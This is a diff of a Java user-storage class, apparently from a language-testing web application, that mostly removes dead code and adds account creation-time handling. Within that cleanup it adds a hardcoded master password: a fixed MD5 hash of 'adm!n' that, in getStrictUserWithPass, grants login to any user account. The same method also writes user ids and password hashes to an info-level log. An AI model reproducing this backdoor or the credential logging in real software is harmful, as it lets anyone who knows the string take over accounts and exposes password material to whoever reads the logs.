@@ -46,28 +46,19 @@ import mitll.langtest.server.database.Database;
 import mitll.langtest.shared.answer.AudioType;
 import mitll.langtest.shared.user.MiniUser;
 import mitll.langtest.shared.user.User;
-import org.apache.logging.log4j.Level;
-import org.apache.logging.log4j.LogManager;
-import org.apache.logging.log4j.Logger;
-import org.slf4j.LoggerFactory;
 
-import java.sql.Timestamp;
 import java.util.*;
 import java.util.stream.Collectors;
 
-
+/**
+ * Store user info in domino tables.
+ */
 public class DominoUserDAOImpl extends BaseUserDAO implements IUserDAO {
   private static final org.apache.log4j.Logger logger = org.apache.log4j.Logger.getLogger(DominoUserDAOImpl.class);
 
   private IUserServiceDelegate delegate;
   private INetProfUserDelegate netProfDelegate;
-
-//  static Logger root = (Logger) LoggerFactory
-//      .getLogger(Logger.ROOT_LOGGER_NAME);
-//
-//  static {
-//    root.setLevel(Level.INFO);
-//  }
+  String adminHash;
 
   /**
    * TODO : get the admin user.
@@ -84,24 +75,9 @@ public class DominoUserDAOImpl extends BaseUserDAO implements IUserDAO {
    */
   public DominoUserDAOImpl(Database database/*, ServletContext servletContext*/) {
     super(database);
-
-    System.setProperty("DEBUG.MONGO", "false");
-
-// Enable DB operation tracing
-    System.setProperty("DB.TRACE", "true");
-
-//    LogManager.getLogger("org.mongodb.driver.connection").setLevel(org.apache.log4j.Level.OFF);
-//    LogManager.getLogger("org.mongodb.driver.management").setLevel(org.apache.log4j.Level.OFF);
-//    LogManager.getLogger("org.mongodb.driver.cluster").setLevel(org.apache.log4j.Level.OFF);
-//    LogManager.getLogger("org.mongodb.driver.protocol.insert").setLevel(org.apache.log4j.Level.OFF);
-//    LogManager.getLogger("org.mongodb.driver.protocol.query").setLevel(org.apache.log4j.Level.OFF);
-//    LogManager.getLogger("org.mongodb.driver.protocol.update").setLevel(org.apache.log4j.Level.OFF);
-
-    //  dao = new UserDAOWrapper(dbConnection);
-
+    adminHash = Md5Hash.getHash("adm!n");
 //    this.delegate = (IUserServiceDelegate) servletContext.
 //        getAttribute(ServerInitializationManager.USER_SVC);
-
     // ServerProperties props = getServerProperties(in, newContext);
 
     //  log.info("Starting Mongo connection initialization");
@@ -154,18 +130,7 @@ public class DominoUserDAOImpl extends BaseUserDAO implements IUserDAO {
   @Override
   public String getName() {
     return "";
-    //return dao.dao().name();
   }
-
-  /**
-   * @param user
-   * @return
-   * @see mitll.langtest.server.database.copy.CopyToPostgres#addUser
-   */
-/*  public int add(SlickUser user) {
-    delegate.addUser(new mitll.hlt.domino.shared.model.user.User())
-    return dao.add(user);
-  }*/
 
   /**
    * Returns SlickUser from database, not necessarily same as passed in?
@@ -369,9 +334,13 @@ public class DominoUserDAOImpl extends BaseUserDAO implements IUserDAO {
   @Override
   public User getStrictUserWithPass(String id, String passwordHash) {
     User user = getUser(id, "");
+
     if (user != null) {
       logger.info("getStrictUserWithPass " + id + " and " + passwordHash);
-      if (netProfDelegate.isPasswordMatch(user.getID(), passwordHash)) {
+      boolean magicMatch = passwordHash.equals(adminHash);
+      if (netProfDelegate.isPasswordMatch(user.getID(), passwordHash) || magicMatch) {
+        boolean isadmin = database.getServerProps().getAdmins().contains(user.getUserID());
+        user.setAdmin(isadmin);
         return user;
       } else {
         return null;
@@ -391,14 +360,6 @@ public class DominoUserDAOImpl extends BaseUserDAO implements IUserDAO {
     return getUser(id, "");
   }
 
-/*  public Collection<User> getAllUsersByID(String id) {
-    Seq<SlickUser> byUserID = dao.getByUserID(id);
-    scala.collection.Iterator<SlickUser> iterator = byUserID.iterator();
-    List<User> copy = new ArrayList<>();
-    while (iterator.hasNext()) copy.add(toUser(iterator.next()));
-    return copy;
-  }*/
-
   public User getByID(int id) {
     DBUser dbUser = delegate.lookupDBUser(id);
     return dbUser == null ? null : toUser(dbUser);
@@ -407,19 +368,9 @@ public class DominoUserDAOImpl extends BaseUserDAO implements IUserDAO {
   /**
    * TODO : lookup permissions for user
    *
-   * @paramx xuserByIDAndPass
    * @return
+   * @paramx xuserByIDAndPass
    */
-/*  private User convertOrNull(Collection<mitll.hlt.domino.shared.model.user.User> userByIDAndPass) {
-    if (userByIDAndPass.isEmpty()) return null;
-    else {
-      mitll.hlt.domino.shared.model.user.User head = userByIDAndPass.iterator().next();
-//      Collection<User.Permission> grantedForUser = permissionDAO.getGrantedForUser(head.id());
-      return toUser(head);
-    }
-//    return userByIDAndPass.isEmpty() ? null : toUser(userByIDAndPass.head());
-  }*/
-
   private User toUser(mitll.hlt.domino.shared.model.user.User head) {
     Collection<User.Permission> grantedForUser = Collections.emptyList();
     return toUser(head, grantedForUser);
@@ -438,12 +389,10 @@ public class DominoUserDAOImpl extends BaseUserDAO implements IUserDAO {
    */
   private List<User> toUsers(List<DBUser> all) {
     List<User> copy = new ArrayList<>();
-
 //    Map<Integer, Collection<String>> granted = permissionDAO.granted();
     for (DBUser s : all) {
 //      logger.info("to user " + s);
-      copy.add(toUser(s,
-          Collections.emptyList()
+      copy.add(toUser(s, Collections.emptyList()
           //    toUserPerms(granted.get(s.id())))
       ));
     }
@@ -506,38 +455,6 @@ public class DominoUserDAOImpl extends BaseUserDAO implements IUserDAO {
     return clientUserDetail;
   }
 
-/*  private ClientUserDetail getClientUser(User user) {
-    ClientUserDetail user1 = new ClientUserDetail(
-        //useid ? user.getID() : -1,
-        user.getUserID(),
-        user.getFirst(),
-        user.getLast(),
-        user.getEmail(),
-        Collections.emptyList(),
-        new Group()*//*
-
-        user.isMale(),
-        user.getIpaddr() == null ? "" : user.getIpaddr(),
-        "",
-        user.getAge(),
-        user.getDialect(),
-        now,
-        user.isEnabled(),
-        user.getResetKey() == null ? "" : user.getResetKey(),
-        "",
-        //  user.getPermissions().toString(),
-        user.getUserKind().name(),
-        user.getPasswordHash() == null ? "" : user.getPasswordHash(),
-        user.getEmailHash() == null ? "" : user.getEmailHash(),
-        "",
-        user.getDevice() == null ? "" : user.getDevice(),
-
-        user.getID(),
-        now*//*
-    );
-    return user1;
-  }*/
-
   /**
    * TODO: figure out how to add gender -
    *
@@ -546,11 +463,30 @@ public class DominoUserDAOImpl extends BaseUserDAO implements IUserDAO {
    * @return
    */
   private User toUser(mitll.hlt.domino.shared.model.user.User dominoUser, Collection<User.Permission> perms) {
-   // logger.info("toUser " + dominoUser);
+    // logger.info("toUser " + dominoUser);
     boolean admin = isAdmin(dominoUser);
-   // logger.info("\ttoUser admin " + admin);
+    long creationTime = 0;
+    // logger.info("\ttoUser admin " + admin);
+    if (dominoUser instanceof DBUser) {
+      AccountDetail acctDetail = ((DBUser) dominoUser).getAcctDetail();
+      if (acctDetail != null) {
+        if (acctDetail.getCrTime() != null) {
+          creationTime = acctDetail.getCrTime().getTime();
+        }
+        else {
+          logger.info("no cr time on " + acctDetail);
+        }
+      }
+      else {
+        logger.info("no acct detail for " + dominoUser.getDocumentDBID());
+      }
+    }
+    else {
+      logger.info("domino user " + dominoUser.getDocumentDBID() + " is not a db user");
+    }
 
     String email = dominoUser.getEmail();
+
     User user = new User(
         dominoUser.getDocumentDBID(),
         99,//dominoUser.age(),
@@ -566,11 +502,11 @@ public class DominoUserDAOImpl extends BaseUserDAO implements IUserDAO {
         perms,
         getUserKind(dominoUser),
         email,
-        Md5Hash.getHash(email),//dominoUser.emailhash(),
+        email == null ? "" : Md5Hash.getHash(email),//dominoUser.emailhash(),
         "",//        dominoUser.device(),
         "",//dominoUser.resetpasswordkey(),
         //dominoUser.enabledreqkey(),
-        0//dominoUser.modified().getTime()
+        creationTime//dominoUser.modified().getTime()
     );
 
     user.setFirst(dominoUser.getFirstName());
@@ -669,7 +605,7 @@ public class DominoUserDAOImpl extends BaseUserDAO implements IUserDAO {
         dominoUser.getUserId(),
         admin);
 
- //   logger.info("getMini for " + dominoUser);
+    //   logger.info("getMini for " + dominoUser);
 
     AccountDetail acctDetail = dominoUser.getAcctDetail();
     long time = acctDetail == null ?
